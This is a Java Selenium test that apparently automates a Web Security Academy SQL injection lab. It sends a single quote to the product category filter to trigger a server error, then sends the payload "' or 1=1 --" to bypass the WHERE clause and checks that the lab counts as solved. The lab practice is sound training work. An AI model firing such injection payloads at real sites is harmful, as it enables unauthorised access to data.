package sa.osama_alharbi.cyber.test.sql_injection;

import jakarta.annotation.PostConstruct;
import lombok.RequiredArgsConstructor;
import org.junit.jupiter.api.Assertions;
import org.junit.jupiter.api.Test;
import org.openqa.selenium.TimeoutException;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.support.FindBy;
import org.openqa.selenium.support.How;
import org.openqa.selenium.support.PageFactory;
import org.openqa.selenium.support.ui.FluentWait;
import org.openqa.selenium.support.ui.Wait;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;

import java.time.Duration;

@SpringBootTest
@RequiredArgsConstructor
public class SQLInj_1_where {
//    public final WebDriver chromeDriver;
    @Autowired
    public WebDriver chromeDriver;
    public Wait<WebDriver> waitDriver;
    private final String url = "https://0a5800a70440761481d2edc3005100b9.web-security-academy.net/";

    @PostConstruct
    public void post(){
        PageFactory.initElements(chromeDriver,this);
        chromeDriver.manage().timeouts().implicitlyWait(Duration.ofSeconds(3));
        waitDriver = new FluentWait<>(chromeDriver)
                .withTimeout(Duration.ofSeconds(5))
                .pollingEvery(Duration.ofSeconds(1))
                .ignoring(TimeoutException.class);
    }
    @Test
    public void test(){
        chromeDriver.navigate().to(url);
        checkIsNotSolved();
        findError();
        attack();
        checkIsSolved();
    }

    @FindBy(how = How.CSS, css = "p.is-warning")
    private WebElement internalServerErrorElement;
    private void findError(){
        chromeDriver.navigate().to(url+"filter?category=Corporate+gifts'");
        waitDriver.until(webDriver -> internalServerErrorElement.getText().equals("Internal Server Error"));
        Assertions.assertEquals("Internal Server Error",internalServerErrorElement.getText(),"there is no SQL injection vulnerability");
    }
    private void attack(){
        chromeDriver.navigate().to(url+"filter?category=Corporate+gifts' or 1=1 --");
    }


    @FindBy(how = How.CSS, css = "div.widgetcontainer-lab-status>p")
    private WebElement solvedStatusElement;
    private void checkIsSolved(){
        chromeDriver.navigate().to(url);
        waitDriver.until(webDriver -> !solvedStatusElement.getText().equals("Not solved"));
        Assertions.assertTrue(!solvedStatusElement.getText().equals("Not solved"),"SQL injection vulnerability is Not Solved");
    }
    private void checkIsNotSolved(){
        chromeDriver.navigate().to(url);
        waitDriver.until(webDriver -> startCheckX(solvedStatusElement.getText().equals("Not solved")));
        stopCheckX();
        Assertions.assertTrue(solvedStatusElement.getText().equals("Not solved"),"How we can start SQL injection vulnerability and it solved");
    }

    static int x = 1;
    public synchronized boolean startCheckX(boolean check){
        x++;
        if(x == 5){
            return true;
        }else{
            return check;
        }
    }
    public synchronized void stopCheckX(){
        x = 1;
    }
}
